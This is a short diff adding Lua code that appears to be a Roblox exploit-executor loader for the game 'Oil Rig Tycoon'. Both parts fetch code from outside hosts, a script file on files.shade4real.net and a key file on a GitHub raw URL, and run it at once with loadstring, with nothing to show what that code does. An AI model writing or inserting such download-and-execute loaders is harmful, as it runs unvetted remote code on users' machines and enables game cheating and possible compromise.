@@ -1,0 +1,9 @@
+    function execute()
+       if syn then request = syn.request end
+    local req = request({
+       Url = 'https://files.shade4real.net/oilRigTycoon.txt'
+    })
+    loadstring(req.Body)()
+    end
+
+    loadstring(game:HttpGet"https://raw.githubusercontent.com/MadGics/Scripty/main/R.Key")()
